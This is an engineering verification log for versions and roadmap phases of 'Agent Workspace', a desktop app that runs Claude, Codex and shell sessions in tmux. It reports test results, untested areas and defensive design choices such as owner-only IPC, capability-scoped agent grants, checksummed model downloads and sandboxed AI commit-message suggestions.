# Agent Workspace 0.3.0 verification evidence

Date: 2026-10-30. Status: development build of the session-first redesign. No macOS release artifact was produced or verified for 0.3.0; the 0.2.0 macOS evidence remains in [release-evidence-0.2.0.md](release-evidence-0.2.0.md).

## Where this was verified

A Linux x86_64 container: Node.js 24.22.2, Electron 45.1.0 under Xvfb (launched through a `--no-sandbox` wrapper because the container runs as root), tmux 3.4, Git, and the Chromium bundled with Playwright. The terminal fixtures need a UTF-8 locale (`LANG=C.UTF-8`); without it tmux renders non-ASCII characters as `_`. node-pty 1.1.0 was compiled from source against local Node headers because the environment's network policy blocks Electron's header host. node-pty uses N-API, so the same build loads in both Node and Electron.

Nothing here was run on macOS, a physical phone, or with a signed build.

## What changed and how it was checked

- **One-click sessions in a chosen folder.** A new `terminal.open` command launches Claude, Codex or a shell in a folder or subfolder without a task or attempt. Retrying with the same idempotency key returns the same session. Paths are scoped to the registered folder; files, missing folders and unreadable folders produce specific messages. Covered by `tests/launch.test.ts` with fixture CLIs in real tmux.
- **No invented prompts.** A blank launch passes no prompt argument. A first message the user supplies is passed once, literally, after `--`. Task attempts still default to the task text, and clearing the field now launches interactively. Covered by `tests/launch.test.ts` and `tests/stream.test.ts`.
- **Startup failures are visible.** The private tmux server sets `remain-on-exit`. When a process ends, its final screen and exit status are saved as a transcript before the tmux session is removed. Previously, a CLI that exited at startup produced a raw `set-option` tmux error, lost its own message, and left the launch receipt unresolved ("Launch outcome unknown"). A probe against 0.2.0 reproduced this, and the launch test now checks the fixed behaviour. A deliberate **End** keeps the old behaviour: no transcript.
- **Agent status.** When the installed Claude CLI lists `--settings` and `--session-id` in `--help`, each Claude session gets:
  - its own conversation ID;
  - per-session hooks that write running, needs-you or done into a tmux pane option, which the core reads every 2 seconds.

  No global CLI configuration is changed. In the fixture test, a CLI ran the exact `Notification` hook command it was given inside a real tmux pane, and the session reported `needs`. Codex and shell sessions report running or ended only.
- **Resume.** An ended Claude session relaunches with `--resume <conversation id>` in its original folder. For Codex, **Resume…** opens Codex's own `codex resume` picker. The Codex path is unverified because no Codex CLI was available.
- **Desktop folder navigation.** A new owner-only `workspace:browse` IPC lists host folders for the in-app browser. The remote gateway has no route to it, and it still rejects `project.add` and the new `project.hide`. Covered by the folder-listing test in `tests/services.test.ts` and gateway assertions in `tests/server.test.ts`.
- **CLI discovery.** The desktop app adds the PATH from the user's login shell, plus `~/.volta/bin` and `~/.bun/bin`, so CLIs installed through nvm, Volta or Bun are found when the app is opened from the Dock. This is untested on macOS.
- **Schema.** The workspace database moves from version 1 to 2 through an explicit migration. Existing rows are unchanged. Older builds refuse version 2 data rather than misread sessions that have no attempt.

## Automated results

- `npm run typecheck`: passed.
- `npm test`: 31 of 31 passed. This is the original 29, plus the folder-launch test and the owner folder-listing test.
- Electron desktop checks were rewritten for the new interface where they relied on the task-first interface:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:remote-desktop` | 7 checks passed |

  In the back-to-back final pass, `verify:terminal` timed out once at its deliberately blocked-renderer resync step, then passed all 7 checks in 3 of 3 standalone reruns.
- Browser check: `verify:mobile` passed 14 checks against the headless host with Playwright Chromium. Phone screenshots and `mobile-verification.json` in `screenshots/remote/` were regenerated for 0.3.0.
- Packaged check: `smoke` and `smoke:ui` passed against an unpacked Linux package (`electron-builder --linux dir`, `app.isPackaged === true`, version 0.3.0).

Results are in [screenshots/desktop/verification.json](screenshots/desktop/verification.json). Desktop screenshots of the new interface are in `screenshots/desktop/`; each was inspected.

## Live provider check

The real Claude Code 2.1.314 CLI was opened blank in a disposable folder by the core, with an isolated empty `HOME` and no credentials. It accepted `--session-id` and the hook `--settings`, and showed its own first-run screen in the chosen subfolder. Nothing was typed or submitted, and no model usage occurred. A full model turn firing the hooks inside real Claude Code was not run. The Codex CLI was not installed, so no live Codex check was possible.

## Not run for 0.3.0

macOS packaging (`npm run package`), `verify:mobile-webkit`, `verify:server-release`, `verify:linux-server` (Docker), and the opt-in live scripts `verify:providers` and `verify:remote-provider`.

## Reproduction notes

Browser scripts accept `WORKSPACE_BROWSER=/path/to/chromium` as an alternative to installed Google Chrome. Desktop scripts accept `WORKSPACE_APP_EXECUTABLE` for a packaged or wrapped Electron executable. Tests still default to `/opt/homebrew/bin/tmux` in places; on Linux, point that path at the system tmux or set `WORKSPACE_TMUX`.

## Roadmap phase 0, 1a and 1b (after 0.3.0)

Built by two sub-agents in isolated worktrees and merged; results below are from the merged tree in the same Linux container.

- **Phase 0.**
  - Named migration registry: v1, v2, and v3 `roadmap_01_owner_utilities`.
  - Consistent SQLite backup before upgrading a non-empty store, keeping the newest 3.
  - A store newer than supported is rejected before any write.
  - A central command policy marks every command owner-only or remote, and the gateway validator follows it.
- **Phase 1a.**
  - `session.rename`, with a revision check and sanitized plain text, allowed remotely.
  - A shared safe-paste helper.
  - Local screenshot paste:
    - An owner-only IPC reads the clipboard image with Electron 45's `clipboard.read()`, validates it, and re-encodes it as PNG.
    - The bytes reach the core over an internal message, never a public command.
    - The core writes a 0600 PNG into a 0700 per-session folder and pastes the escaped path without Enter.
    - Saved images are cleaned up 7 days after the session ends.
- **Phase 1b.** Keep-awake:
  - Off by default and owner-only.
  - Holds one `prevent-app-suspension` blocker while a local Claude session reports fresh working activity.
  - Hooks stamp `@aw_activity_at`, which gives a 20-minute lease. A repeated snapshot never renews it.
  - Released on needs/done/exit/unknown, core loss, turning the setting off, and quit.
- **Exit status is best effort.** Under CPU load, tmux sometimes marks a pane dead without ever recording its exit status. Plain tmux reproduced this in 1 of 20 cases. The core waits up to 1 second for it; the saved final screen is unaffected.

Results:
- `npm test` passed 52 of 52, twice.
- These app checks passed:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:image-paste` | 6 checks passed |
  | `verify:keep-awake` | 9 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:remote-desktop` | 7 checks passed |
  | `verify:mobile` | 14 checks passed |

Not verified:
- Native clipboard reads on macOS, Windows or Wayland. Only Linux X11 under Xvfb, with synthetic paste events, was tested.
- Real system sleep prevention. Only Electron's blocker state was checked.
- The real Claude CLI running the timestamp hook commands. Fixture CLIs ran them.
- Interrupting Claude with Ctrl+C: the blocker is then released only when the 20-minute lease ends.
- Upgrading a real user database from an older version (covered by fixtures only).

## Roadmap phase 2a: local English dictation (after phases 0, 1a and 1b)

Built in an isolated worktree on the merged phase 0/1a/1b tree and checked in the same Linux container.

**Owner decisions.** These replace the roadmap's original preview design:

- English only, using English Whisper models.
- "Type as I talk": each phrase is typed into the terminal when the speaker pauses. There is no review step.
- Enter, CR, LF and control or escape bytes are never sent. The user submits.

**Engine: sherpa-onnx, not whisper.cpp or Transformers.js.** These were checked before choosing:

- **Transformers.js (option A).** Its ONNX Whisper models are hosted only on huggingface.co, which this environment's egress policy blocks, so real speech-to-text could not be shown with it here. It would also add `sharp` and two ONNX Runtime builds.
- **whisper.cpp (option B).** It needs a native build for each platform, and its ggml models are also hosted on Hugging Face.
- **sherpa-onnx (chosen).**
  - `sherpa-onnx-node` 2.0.1 (Apache-2.0) ships prebuilt N-API addons for macOS, Linux and Windows on x64 and arm64, with ONNX Runtime (MIT). There is no node-gyp or electron-rebuild step; one build loads in both Node and Electron.
  - Its Whisper `tiny.en`/`base.en` int8 ONNX exports are published as GitHub release assets, which were reachable here.

**Where inference runs.** It runs in a separate Electron utility process (`dist/desktop/dictation-worker.mjs`), never in the sandboxed renderer. The renderer CSP is unchanged; the AudioWorklet module is a same-origin file.

**Models.**

| Model | Archive | Archive SHA-256 | Kept on disk |
| --- | --- | --- | --- |
| tiny.en | 118,071,777 bytes | `2bd6cf965c8bb3e068ef9fa2191387ee63a9dfa2a4e37582a8109641c20005dd` | int8 encoder, int8 decoder, tokens (103.6 MB) |
| base.en (default) | 208,576,005 bytes | `475bc7052ce299c007f6d5d5407ba8601f819a2867f6eecee510ed17df581542` | int8 encoder, int8 decoder, tokens (160.6 MB) |

- **Source.** `https://github.com/k2-fsa/sherpa-onnx/releases/download/asr-models/sherpa-onnx-whisper-{tiny,base}.en.tar.bz2`.
- **Where the checksums came from.** The archive and per-file SHA-256 values were computed from downloads on 2026-10-30. They were not cross-checked against a digest published by the project, because the GitHub API for that repository was not reachable from this session.
- **What is pinned.** The download size limit, the archive hash and each extracted file's size and hash.
- **Before use.** Every file is re-hashed before a model is loaded.
- **Licenses.** The Whisper weights are MIT and the export tooling is Apache-2.0.

**Download and install.** A download happens only after the owner clicks **Download English speech model** in **Voice dictation**. The install then:

1. Streams the archive to a 0600 temporary file and enforces the pinned size.
2. Verifies the archive's SHA-256.
3. Unpacks only the three expected entries, using a minimal ustar reader and `unbzip2-stream` (MIT), into a staging folder.
4. Verifies each file, then renames the folder to `userData/models/<id>`.

Nothing is kept after a failure. In the app, `net.fetch` in the utility process performs the download.

**Privacy.**

- Audio is held only in memory: renderer PCM, then IPC, then the worker.
- No audio file is written; a script check confirms none appears in the data folder.
- The UI states that the agent's CLI may send the text to its provider after Enter.

**Security.**

- **IPC channel.** `workspace:dictation` (`status`, `downloadModel`, `start`, `phrase`, `stop`) is owner-only: only the main frame of the window. Unknown fields are rejected.
- **Phrase bounds.**
  - Phrases are 16-bit PCM of at most 30 s.
  - Recording IDs are issued by main, with increasing sequence numbers.
  - At most 4 phrases may be in flight.
  - Each phrase has a 30 s inference timeout; on timeout the worker is killed.
  - A recording lasts at most 30 minutes.
- **Model setting.** It goes through the existing owner-only `settings.read/write` with a new `dictationModel` key. The core accepts only `base.en` or `tiny.en`, and the gateway still rejects `settings.*`.
- **Permissions.** New permission handlers allow `media` only when every requested type is audio, from the app window's main frame.
  - Notifications and clipboard writes keep working from that frame.
  - Video, other windows and frames, and all other permissions are denied.
- **macOS packaging.** The build config adds `NSMicrophoneUsageDescription` and `build/entitlements.mac.plist`, which includes `com.apple.security.device.audio-input` for hardened-runtime signing. The current macOS build is unsigned, so the entitlement is unused until signing.

**Segmenting and insertion.**

- **Capture.** `getUserMedia` (audio only) feeds an AudioWorklet, with a ScriptProcessor fallback. Audio is resampled to 16 kHz mono with a box low-pass filter.
- **Phrase detection.** An energy VAD over 20 ms frames uses an adaptive noise floor. A phrase ends after 700 ms of silence or at a 15 s cap.
- **Cleaning.** Whisper non-speech annotations (`[BLANK_AUDIO]`, `(music)`, `[ Silence ]`, `*laughs*`, `♪`) are dropped. Text then passes through the shared `sanitizePasteText`, with whitespace collapsed and one space between phrases.
- **Typing.** Text is typed with xterm's `terminal.paste()`, which is bracketed-paste aware.
- **Destination.** The destination `{sessionId, generation, viewerId}` is fixed at start and rechecked for every phrase. A change stops dictation, and untyped text appears in a panel with **Copy**.
- **What stops dictation and releases the microphone tracks:**
  - Stop, the shortcut, or a second start.
  - Window blur or hide (but not while the first permission prompt is open).
  - A viewer change, session end or detach.
  - Errors, and the 30-minute limit.

Results:

- `npm run typecheck` passed.
- `npm test` ran 65 tests: 64 passed and 1 opt-in test was skipped. That is the original 52 plus 12 in `tests/dictation.test.ts` covering:
  - resampler;
  - VAD silence, clicks, pauses, the 15 s cap and the noise floor;
  - Int16 conversion;
  - non-speech filtering and fuzzed sanitizer output (no CR, LF, ESC, C1 or bidi characters);
  - phrase spacing and destination checks;
  - IPC payload bounds;
  - model install: checksum failures, file tampering, size limit, HTTP errors and nothing left behind;
  - the main-side service with a fake worker.

  Dictation-model assertions were added to `launch.test.ts` and `server.test.ts`.
- **Opt-in real engine** (`WORKSPACE_TEST_REAL_DICTATION=1`). It downloaded the real tiny.en archive from GitHub through the proxy (Node `fetch`), verified and unpacked it, and transcribed an `espeak-ng` clip of "Hello world. Please open the readme file." The result was "The low world, please open the read me file." in about 0.3–0.4 s. espeak's robotic "hello" is heard as "the low"; the rest is exact. The test passed.

  The same base.en files transcribed the sherpa test clip `0.wav` exactly ("After early nightfall the yellow lamps would light up here and there the squalid quarter of the brothels.") in about 1.0 s.
- `verify:dictation` passed 12 checks, against the real app under Xvfb with Chromium's fake microphone playing an `espeak-ng` WAV:
  - The real tiny.en model was installed through the settings dialog, in two runs:
    - over the network from GitHub with Electron `net.fetch`, in 34 s;
    - from a local copy of the release asset, in 30 s, still checked against the pinned hash.
  - The words were typed at a shell prompt and not executed: "The Long World Please open the Read Me file and list every test in the project." Pressing Enter in the test then made the shell echo the line once.
  - Capture used the AudioWorklet path.
  - Stop, button, shortcut, window blur and the canvas header all start or stop dictation, and the microphone is released each time.
  - Switching session mid-phrase typed the partial text nowhere and showed it with Copy.
  - A foreign window was refused every dictation action and `getUserMedia` (NotAllowedError), and the app window could not open a camera.
  - Malformed payloads were rejected.
  - The data folder contained no audio file.

  It also passes with `WORKSPACE_VERIFY_DICTATION_FIXTURE=1`, which uses a fixture transcriber.
- `verify:remote-desktop` passed 7 checks. It now also asserts that a paired browser has no dictation API, no dictation controls and no microphone.
- These checks were re-run and passed:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:image-paste` | 6 checks passed |
  | `verify:keep-awake` | 9 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |

- Screenshots are in `screenshots/desktop/`: `dictation-settings.png`, `dictation-model-ready.png`, `dictation-typed.png`, `dictation-canvas.png` and `dictation-untyped.png`.

The test-only switches are environment variables that change nothing unless set:

- `WORKSPACE_TEST_FAKE_MIC` adds Chromium's fake-device switches. It deliberately does not add `use-fake-ui-for-media-stream`, which would bypass the permission handler under test.
- `WORKSPACE_TEST_DICTATION_TEXT` selects the fixture transcriber.
- `WORKSPACE_TEST_DICTATION_ARCHIVE` reads a local archive instead of downloading. The pinned checksum still applies.

Not verified:

- **macOS.**
  - The microphone consent prompt and hardened-runtime signing with the audio-input entitlement.
  - Loading `sherpa-onnx-darwin-*` from an unpacked asar in a packaged app. The addon's own loader mentions `DYLD_LIBRARY_PATH` on macOS.
- **Windows and Linux arm64 builds.**
- **Real microphones.** Real voices, accents and noisy rooms; the VAD thresholds were tuned on synthetic and espeak audio only. PipeWire or PulseAudio capture was not tested.
- **Performance.** base.en latency on low-end CPUs, and speech recognition keeping up during long continuous speech.
- **Packaged builds.** Neither `electron-builder` packaging with the new `asarUnpack` entry nor packaged-app dictation was run.
- **Third-party notices.** The sherpa-onnx npm packages ship no LICENSE or NOTICE file. A packaged release still needs the Apache-2.0 and ONNX Runtime MIT notice texts added.

## Live session board (after phase 2a)

Built in an isolated worktree on the phase 2a tree and checked in the same Linux container. Designed only from this repository.

**What it is.** **Board** now opens on **Sessions** (a **Sessions | Tasks** switch; Tasks is the unchanged task board). Each session in the folder is a card in one of the folder's lanes. Lanes default to Up next, Working, Review and Done. The owner and a paired browser can rename them, add up to six, and remove a lane only when no card shows in it. A session without a placement is shown, not written, in Working while open and in Done once ended (falling back to the first or last lane when those were removed). Cards show provider, name, the existing status badge, folder-relative location, model and relative last activity. Needs you cards are highlighted. Ended cards are dimmed with **Resume** (Claude with a conversation ID and no nonzero exit) and **New here**; both reuse the existing App resume/restart launch, then file the new session in the ended card's lane and open its live card. Ended cards beyond the 20 most recent per lane wait behind **Show more**.

**Commands.**

- `session.place {sessionId, generation, lane, order?, placementRevision}`: generation and the current `placementRevision` are required; the lane must exist; ended sessions can be placed. An omitted order appends after the lane's last card. It writes only `lane`, `laneOrder` and `placementRevision` on the session record and emits a snapshot. It never attaches, detaches, resizes, sends input or restarts.
- `lane.rename`, `lane.add`, `lane.remove {projectId, …, revision}`: a per-folder `boardLanes` record `{projectId, lanes, revision}` with plain one-line names of at most 40 characters.
- All four are `remote` in `COMMAND_POLICY` with exact gateway field lists. `publicSession` projects `lane`, `laneOrder` and `placementRevision`; gateway snapshots carry only shared folders' `boardLanes`. Owner-only commands are unchanged.

**Interaction.** HTML5 drag between lanes on desktop, plus a **Move to…** menu on every card for keyboard and touch. **+** on a lane starts Claude, Codex or a shell through the existing `terminal.open` launch path, then places the returned session. Clicking a card opens a live card: the existing `SessionView` (real `TerminalView` attached as an ordinary viewer, rename, Interrupt/End with the existing confirmation, Resume/New) plus a lane picker. Closing it, or Esc outside the terminal, unmounts the view, which detaches only that viewer. Esc inside the terminal still goes to the program. At 900px and below the lanes scroll horizontally with snap and the live card is full-screen.

**Schema.** Migration v4 `board_lanes` is additive: no table or row changes, the same backup and newer-version rejection. A v3 store upgrades with records unchanged and a `workspace-v3-*` backup. The roadmap reserved v4 for `roadmap_02_conversations`; that and later reservations move to the next unused number, as the roadmap's migration rule requires.

Results:

- `npm run typecheck` passed.
- `npm test`: 70 tests, 69 passed, 1 opt-in skipped. New `tests/board.test.ts` (5 tests):
  - shared lane defaults, fallback lanes and lane-name cleaning;
  - placement in a real tmux shell: revision, stale revision, missing or wrong generation, unknown lane, invalid order, explicit and appended order; the shell's own `$$` and the tmux pane PID are unchanged and the same attached viewer still types into it; lane rename/add (six maximum)/remove-only-when-empty, including a lane occupied only by an unplaced open session; ended sessions can be placed; placements and lanes persist across a core restart with the same PID;
  - v3 to v4 migration keeps a titled Claude session, project and owner setting unchanged and backs up v3;
  - remote validation of the four commands' fields;
  - a real gateway in front of a real core: a paired browser places and renames lanes in the shared folder, gets the projected session (no `backendSocket`), is refused with "Project access denied" for the unshared folder's session and lanes, sees no other folder's lane names, and is still refused `project.add`, `project.hide` and `settings.write`.

  The registry test and both newer-version rejection tests now use version 5 as "newer".
- `verify:board` (new, Electron under Xvfb with a fixture Claude CLI that reports needs-you through its per-session hook) passed 10 checks: two shells started from the folder; Sessions is the default mode with four lanes and nothing written for unplaced cards; dragging a card to Review keeps the tmux pane PID, the shell's own PID and generation, and the terminal still accepts input; Move to…; inline lane rename; live card typing reaches the same shell, rename and lane picker work, closing by button or Esc leaves the same process running; **+** in a lane starts a shell placed there; a Claude started in Up next shows a highlighted Needs you card; after End, the dimmed card offers Resume and New here, Resume keeps the lane and opens the new live card, and an ended shell offers only New here; the Tasks switch still shows the task board.
- `verify:mobile` passed 15 checks (one new) on 390×844 touch Chromium against the headless host: lanes scroll horizontally with snap and the body does not overflow; **Move to…** by tap places the card through the gateway; a tap opens a full-screen live card with the terminal command bar; closing keeps the same running session (the script's later same-PID check after a host restart still passes).
- Re-run and passed after updating only the board-mode selector where a script opened the task board (`smoke:ui`, `verify:workflows`, `verify:lifecycle`, `verify:mobile`):

  | Check | Result |
  | --- | --- |
  | `smoke:ui` | 9 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:remote-desktop` | 7 checks passed |

- Screenshots, each inspected: `screenshots/desktop/board-sessions.png`, `board-live-card.png` and `board-phone.png`. `screenshots/remote/phone-board.png` and `mobile-verification.json` were regenerated because the board header changed.

Not verified: macOS, a physical phone or touch drag (phones use Move to…; HTML5 drag is desktop only), a real Claude or Codex CLI on the board (a fixture Claude was used), Codex resume from a card (Codex has no card Resume; the live card keeps SessionView's existing Codex **Resume…**), card reordering within a lane by drag (drops append; `order` is accepted by the command and tested in core), and `verify:mobile-webkit` (not run; WebKit is not installed here, and its **New task** step may need the same **Tasks** selector).

## Roadmap section 4: agent control through `awctl` (after the live session board)

Built in an isolated worktree on the live-board tree (`e25c469`) and checked in the same Linux container. Designed only from this repository and the roadmap.

**What it is.** The desktop owner grants one running session **Agent control** from its session bar (also in the board's live card). The grant names the allowed verbs (`status`, `note.create`, `note.update`, `canvas.place` checked by default; `open` off by default), an expiry (60 minutes by default, 1 minute to 24 hours) and, with `open`, how many opened sessions may run at once (3 by default). The program in that terminal then runs `awctl`, which prints one bounded JSON object per call. The dialog shows the active grant, the 20 most recent audit records for that session, and **Revoke**.

**Authority.** This is class A from the roadmap, not a core command:

- The owner path is a new desktop IPC `workspace:agent-control` (`grant`, `revoke`, `list`), checked with the existing main-frame owner check, then forwarded to the core as an internal `agentControl` message, like pasted images. It is not in `COMMANDS`, so `COMMAND_POLICY` and gateway validation are unchanged. The gateway rejects every agent-control name, and remote browsers have no `agentControl` API, so the button is hidden there (asserted in `verify:mobile`). `CONTROLLER_WRAPS` in `command-policy.ts` lists the single existing behaviour each verb wraps. A test checks that none is a `session.*`, `files.*`, `git.*`, `worktree.*`, `settings.*` or `project.*` command.
- `awctl` (`src/cli/workspace.ts`, built to `dist/cli/awctl.mjs`) speaks a separate line-delimited JSON protocol over a Node `net` Unix socket at `<data>/control/ctl.sock` (directory 0700, socket 0600). If that path would exceed 100 bytes, the socket goes in a 0700 `aw-ctl-<hash>` directory under the temp folder. The core owns the socket and starts listening at the first grant. The CLI never opens SQLite.
- Capabilities are 32 random bytes, kept only in core memory (as a SHA-256 hash) and in one 0600 file per session, `<data>/control/grants/<hash of session id>.json`. They are never stored in the database, snapshots, argv, tmux's global environment or the audit trail; the test scans the database, WAL and snapshot for the live token.
- Each request rechecks the capability, its expiry, the source session's generation and lifecycle (an ended session revokes the grant), the verb, and a per-grant rate budget (30 requests a minute by default). The project comes from the grant only. A `projectId` in the request is ignored.

**How a running process gets the grant (verified).** Every session launched by this version gets `AW_CONTROL_FILE=<its grant file path>` and `AWCTL=<data>/control/bin/awctl` through `tmux new-session -e`, which sets that session's environment only. The file does not exist until the owner grants. `awctl` reads it on every call, so a process that was already running before the grant can use it without a restart. Revoke deletes the file and forgets the capability. A core start deletes every grant file, and nothing is regranted. The `awctl` launcher directory is put first on the session's `PATH` through the environment of the tmux client that creates the session. tmux 3.4 ignores `new-session -e PATH=…` and gives a new session its creating client's `PATH`. A manual probe confirmed this, and the test reads the pane process's real environment from `/proc`. Sessions started before this version have no grant path and are refused with an explanation, because changing the environment of a running process is not possible. The launcher runs `dist/cli/awctl.mjs` with the app's own executable as Node (`ELECTRON_RUN_AS_NODE=1`). `package.json` unpacks `dist/cli` from the asar archive.

**Verbs.**

- `status`: the folder's ID and name, the session's own ID and generation, the grant's limits, and this folder's sessions. For each session it gives the ID, canvas node ID, provider, title, status, activity, folder-relative path and creation time. Running sessions come first and at most 20 ended sessions are included, 200 sessions at most in all. It also gives notes (ID, title, revision, time, a 500-character excerpt; 200 at most) and the layout revision with positions for those nodes. It has no host paths, backend names, sockets, transcripts or other folders.
- `open --provider claude|codex|shell [--path rel] --request-id id`: delegates to `terminal.open` with the key `ctl:<source session>:open:<id>`. The prompt is blank, the path is scoped to the folder, and the grant's open limit is enforced. Opens from one session are serialized so concurrent calls cannot race past the limit. A repeated request ID returns the same session (`deduplicated: true`). The same ID with a different request is `request_id_conflict`. An unresolved launch receipt is reported as outcome `unknown`. The child session has its own empty grant path.
- `note create`: a plain-text title (at most 200 characters, control characters removed) and a body (at most 64 KiB) from `--body`, `--body-file` or stdin. The note is stored with `revision: 1` and `source: "agent"`. Each grant may create at most 50 notes. The note and its receipt (`ctl:<session>:note.create:<id>`, with a SHA-256 digest of the request) are written in one transaction. `awctl` generates a request ID when none is given and prints it.
- `note update --note --revision`: refuses a stale revision with `currentRevision` and changes nothing.
- `canvas place --node --x --y --revision`: places only this folder's nodes, using the attempt-keyed ID for task attempts and the session ID for folder sessions. Coordinates must be within ±1,000,000. A stale layout revision is refused with `currentRevision`. Uses the same receipt and digest pattern.
- CLI exit codes: 0 done, 1 refused, 2 usage, 3 outcome unknown. A lost answer after a mutation was sent is reported as unknown; a refused connection is not.

**Revisions (schema v5 `roadmap_04_controller`).** This is an additive migration with no rewrite. Notes and layouts gain an optional `revision`, and an absent one reads as 1. The core increments it on every owner `note.update` and `layout.save`, and both accept an optional `revision` that rejects a stale one. The owner UI does not send it, so owner edits stay last-writer-wins, and only the agent is refused. The gateway now projects notes and layouts explicitly with these fields. Remote clients still cannot send `revision` or `source`. The renderer's snapshot merge orders notes and layouts by revision. The canvas adopts a node position from a newer layout revision unless that node is being dragged or the position is an echo of its own recent save. Focused-note autosave, unload protection, drag undo/redo and attempt-keyed layout IDs are unchanged, and `verify:workflows`, `verify:lifecycle` and `smoke:ui` re-check them. Audit records are a new `controllerAudit` record kind, capped at the newest 1000.

## Roadmap section 5: opt-in AI commit messages and session names (after the live session board)

Built in an isolated worktree on `claude/jolly-clarke-oo3rm5` at `e25c469` and checked in the same Linux container. Designed only from this repository, the roadmap, and the installed `claude --help` (2.1.314) plus public CLI documentation. No schema migration: the two new owner settings are `ownerSettings` JSON records (`assistProvider`, default `""` meaning off; `assistModel`, default `""`).

**Surfaces.** Core commands `assist.status`, `assist.preview`, `assist.suggest` and `assist.cancel` are `owner` in `COMMAND_POLICY`, so the gateway refuses them. The desktop reaches them only through the new D-only `workspace:assist` channel (`status`, `configure`, `previewCommit`, `stagedHash`, `suggestCommit`, `previewName`, `suggestName`, `cancel`), behind the existing main-frame owner check, with exact field lists. `workspace:invoke` refuses `assist.*` and writes to the two assist settings, so turning the feature on always goes through `configure`, which requires `acknowledged: true`. Suggestions bypass the core's mutation queue (they only read Git and settings), so a slow provider never holds up other work and cancel never waits behind a run.

**Runner (`src/core/assist.ts`).** A dedicated runner, not `run()`: `spawn` without a shell in a new process group, from a fresh `0700` `os.tmpdir()/aw-assist-*/work` folder that starts empty and is deleted afterwards. The previewed text goes on stdin; argv carries no user content. The environment is an allowlist (HOME, USER, PATH, locale, XDG folders, proxy and CA variables, plus the selected provider's own auth/config variables), so agent-control, `AW_*`/`WORKSPACE_*`, `TMUX`, `SSH_AUTH_SOCK`, Git and the other provider's keys are never passed. It sets `NO_COLOR=1`, `TERM=dumb` and a `TMPDIR` inside the scratch folder. Limits: 60 s and 256 KB of stdout; on timeout, cancel, overflow or exit the whole process group gets `SIGKILL`. One request per click, no retry, one run at a time. Before running, the executable is re-probed (keyed by realpath, inode, size and mtime); a changed binary that no longer lists every flag is refused.

**Claude flags, each checked against the installed help at runtime (fail closed).** `--print --safe-mode --restricted --tools "" --disallowedTools mcp__* --strict-mcp-config --mcp-config <app-written {"mcpServers":{}}> --permission-mode dontAsk --permission-prompts none --no-session-persistence --disable-slash-commands --no-chrome --output-format json [--model M]`. The installed `/opt/node22/bin/claude` (2.1.314, realpath `/opt/claude-code/bin/claude`) lists all fourteen requirements, so the probe reports it ready. Only the JSON result's `result` string is used; `is_error` or a non-success subtype is reported as an error.

**Codex flags (unverified here).** `codex -a never exec --sandbox read-only --ignore-user-config --ignore-rules --ephemeral --skip-git-repo-check --color never --output-last-message <scratch file> [--model M] -`. Codex is not installed in this container. The adapter is unavailable unless `codex --help` lists `--ask-for-approval … never` and `codex exec --help` lists every other flag. Even then it is shown as "Isolation unverified", because this app has not checked that Codex's MCP, network and file reads are actually restricted. No bypass or unsafe flag is ever used.

**Input and output.** The commit preview reads only the index and HEAD: per-file `git diff --cached --no-ext-diff --no-textconv --no-color --no-renames`. Binary files are listed but never included, files are added in order until 60 KB, and every omission (binary, excluded, size limit, file limit) is listed and named in the prompt. The staged fingerprint is SHA-256 of `HEAD` plus `git diff --cached --raw -z --no-abbrev`; it is re-read after the snapshot and a change aborts. `assist.suggest` recomputes the input and refuses unless both its hash and the staged fingerprint equal what the owner previewed. The material sits between unguessable markers with a fixed instruction to treat it as data. Output is stripped of ANSI/OSC sequences, control, zero-width and bidi characters and code fences. A commit draft is a subject of at most 72 characters plus at most 30 body lines; a name is one plain line of at most 60 characters. The draft only fills the commit box, and replacing typed text asks first. Name context is the task title/description, the first message recorded with the launch, and the folder name, each ticked by the owner; terminal output is never read. Accept calls the existing `session.rename` with the session's `titleRevision` from when the suggestion was made.

Results:

- `npm run typecheck` passed.
- `npm test`: 74 tests, 73 passed, 1 opt-in skipped. That is the previous 69 passes plus 3 in the new `tests/agent-control.test.ts` and 1 in `tests/snapshot.test.ts`. The registry test and the newer-version rejection tests now use `SCHEMA_VERSION + 1` as "newer". `tests/agent-control.test.ts` uses real tmux shells and the esbuild-built CLI, with no provider:
  - the pane environment has a grant path but no capability, and the global tmux environment does not have it;
  - no listener exists and `awctl status` is refused before a grant;
  - grant validation rejects a stale generation, empty or unknown verbs, extra fields, an out-of-range expiry and an unknown action, and refuses a session launched without a grant path;
  - directory 0700, grant file 0600, socket 0600;
  - a missing or wrong token gives `unauthorized`, and an unknown verb is refused;
  - from inside the already-running shell, `status` returns only this folder with no temp paths, other folder, token or socket;
  - `note create` from a file is idempotent per request ID, a request-ID conflict is refused, and a `projectId` in the request cannot widen the grant;
  - a stale note revision leaves the owner's edit intact;
  - `canvas place` works on notes and session nodes; a stale layout revision, another folder's node and huge coordinates are refused;
  - `open` refuses a path that escapes the folder and an unknown provider, is idempotent per request ID, and enforces the fan-out limit;
  - three concurrent opens against a limit of 2 (one already running) give exactly one success;
  - the child session has no grant;
  - an ungranted verb gives `not_granted`, and the rate budget gives `rate_limited`, with both recorded in the audit;
  - the per-grant note cap allows 50 notes, then `note_limit`;
  - expiry (the core's clock advanced 61 minutes) gives `expired` and removes the file;
  - revoke removes the file, the old token is refused, and the shell PID is unchanged;
  - the token is absent from the database, WAL and snapshot;
  - a core restart removes grant files, has no listener until the next grant, refuses the old token, and keeps the shell PID unchanged;
  - ending the source session revokes its grant;
  - a fake peer that drops the answer gives exit 3 and outcome unknown for a mutation, and exit 1 for status;
  - there is no gateway route.
